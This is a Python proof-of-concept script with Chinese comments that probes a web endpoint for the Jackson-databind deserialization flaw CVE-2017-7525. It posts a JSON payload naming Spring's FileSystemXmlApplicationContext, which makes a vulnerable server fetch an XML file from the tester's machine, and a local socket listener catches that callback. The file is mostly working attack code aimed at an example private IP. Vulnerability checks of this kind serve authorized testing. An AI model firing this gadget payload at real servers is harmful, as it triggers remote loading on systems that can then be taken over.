# -*- coding:utf-8 -*-
#Written by hacden 2020/07/15
#Exec python3
'''
Jackson-databind 反序列化漏洞（CVE-2017-7525）
受影响的版本
Jackson-databind version <= 2.9.3
Jackson-databind version <= 2.7.9.1
Jackson-databind version <= 2.8.10
修复：升级Jackson-dababind的最新主要版本
'''
import requests
import string
import random
import socket
import multiprocessing


def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def get_localhost_ip():
    #查询本机ip地址
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('8.8.8.8',80))
        localhost = s.getsockname()[0]
        return localhost
    except:
        localhost  = "127.0.0.1"
        return localhost

def get_recv_data(url_dir,string_reve,localhost):
    try:
        service_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        service_server_socket.bind((localhost, 23456))
        service_server_socket.listen(1)
        service_server_socket.settimeout(4.0)
        service_client_socket, cliet_ip_port = service_server_socket.accept()
        recv_data = service_client_socket.recv(4096)
        if string_reve in str(recv_data):
            print("[+] There is Seem is Jackson-databind 反序列化漏洞CVE-2017-7525 Vuln on %s"%url_dir)
            service_client_socket.close()
            service_server_socket.close()
            exit(1)
    except:
        exit(0)

def create_process_linten(url_dir,string_reve,localhost):
    try:
        p = multiprocessing.Process(target=get_recv_data, args=(url_dir,string_reve,localhost))
        p.start()
    except:
        print("[-] Create process error!")

def check_jackson_rce(url_dir,string_reve,localhost):
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/json",
        'Accept': "*/*",
    }
    payload = "{\"param\":[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://%s:23456/%s.xml\"]}"%(localhost,string_reve)
    res = requests.post(url=url_dir,headers=headers,data=payload,timeout=3,verify=False)


def verify(protol, ip, port,exploit_dir):
    ip = ip.strip()
    exploit_dir = exploit_dir.strip()
    if port.strip():
        url_dir = protol.strip() + "://" + ip + ":" + port.strip() + exploit_dir
    else:
        url_dir = protol.strip() + "://" + ip + exploit_dir
    stringLength = 50
    string_reve = random_string(stringLength)
    localhost = get_localhost_ip()
    create_process_linten(url_dir,string_reve, localhost)
    try:
        check_jackson_rce(url_dir, string_reve, localhost)
    except requests.ReadTimeout:
        pass
    except Exception as e:
        print("[-] There is Not Seem Jackson-databind 反序列化漏洞CVE-2017-7525 Vuln! Error: %s "%str(e))
        exit(0)

if __name__ == '__main__':
    ip =  "                 192.168.43.9                                                            "
    verify("http",ip, "8080","  /exploit    ")

